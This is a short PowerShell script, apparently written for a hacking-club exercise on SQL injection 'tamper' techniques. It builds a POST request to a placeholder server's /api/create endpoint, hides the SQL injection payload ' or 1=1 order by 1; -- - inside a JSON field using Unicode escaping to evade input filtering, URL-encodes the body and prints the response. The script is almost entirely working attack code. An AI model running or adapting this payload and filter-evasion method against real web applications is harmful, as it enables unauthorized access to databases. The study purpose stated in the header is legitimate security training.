#==============================================================================================#
# Descrição: Script básico em powershell destinado ao estudo de SQLi Tamper's. (Hacking Club)  #
# Desenvolvido por: Ivan Barbosa Kovalinkinas                                                  #
# Versão: 1.0.0 Beta                                                                           #
# Data: 24/11/2024                                                                             #
#==============================================================================================#
$server = 'http://X.P.T.O'    # Endereço do Servidor
$api = '/api/create'          # Rota da API

# Função recebe uma string e a converte para URL encode
function Set-URLEncode {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$String_Input
    )

    begin {
        $urlEncode = New-Object System.Text.StringBuilder
        $secureURLString = @()
        foreach( $charInt in (48..57 + 65..90 + 97..122) ) {
            $secureURLString += [char]$charInt
        }
    }

    process {
        $String_Input.ToCharArray() | ForEach-Object {
            if( $secureURLString -ccontains $_ ) {
                $urlEncode.Append($_) | Out-Null
            }
            else {
                $urlEncode.AppendFormat("`%{0:X2}", [int][char]$_) | Out-Null
            }
        }
    }

    end {
        $urlEncode.ToString()
    }
}

# Função recebe uma string e a converte para Unicode
function Set-UnicodeEncode {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$String_Input
    )

    begin {
        $unicodeEncode = New-Object System.Text.StringBuilder
    }

    process {
        $String_Input.ToCharArray() | ForEach-Object {
            $unicodeEncode.AppendFormat("\u{0:X4}", [int][char]$_) | Out-Null
        }
    }

    end {
        $unicodeEncode.ToString()
    }
}

# OPCIONAL: Cabeçalho da requisição
$headers = @{
    "Accept"            = "*/*"
    "Accept-Encoding"   = "gzip, deflate"
    "Accept-Language"   = "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3"
    "Connection"        = "keep-alive"
    "Content-Type"      = "application/x-www-form-urlencoded"
    "Origin"            = "$server"
    "Referer"           = "$server"
    "User-Agent"        = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
}

# Query SQL que será enviada na requisição
$querySQL = ''' or 1=1 order by 1; -- -'

# Corpo da requisição
$bodyRequest = "data=$(Set-URLEncode -String_Input '{"name":"new hacker","nick":"tamper ')$(Set-UnicodeEncode -String_Input $querySQL)""}"

# Requisição POST na API vulnerável
$webRequest = Invoke-RestMethod -Uri "$($server)$($api)" -Method Post -Headers $headers -Body $bodyRequest

# Resposta da requisição
$webRequest.hacker
